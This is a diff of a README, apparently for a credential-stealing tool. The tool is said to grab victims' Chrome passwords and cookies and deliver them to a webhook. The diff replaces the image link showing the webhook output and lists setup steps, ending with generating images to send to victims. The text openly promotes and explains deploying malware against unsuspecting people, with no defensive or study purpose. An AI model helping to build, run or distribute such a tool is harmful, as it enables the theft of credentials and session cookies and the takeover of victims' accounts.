@@ -22,10 +22,10 @@
  -  All Their Chrome Passwords And Cookies
 > Webhook looks like this:
 
-<p align="left"><img src="![image](https://user-images.githubusercontent.com/100600051/159165790-ea3edf9a-c970-41c1-ba9c-7631cafb857d.png)"</p>
+<p align="left"><img src="![image](https://media.discordapp.net/attachments/732961490713182299/955101837713887272/unknown.png)"</p>
 
-### 📁・Setup:
-1. Start off by installing [python](https://www.python.org/) ofc
+### 🌌・Setup:
+1. Start off by installing [python](https://www.python.org/) 
 2. open command promt type -> python main.py
 3. your software opens, and there you can select your options
 5. it generates images that you send to youre victims <$
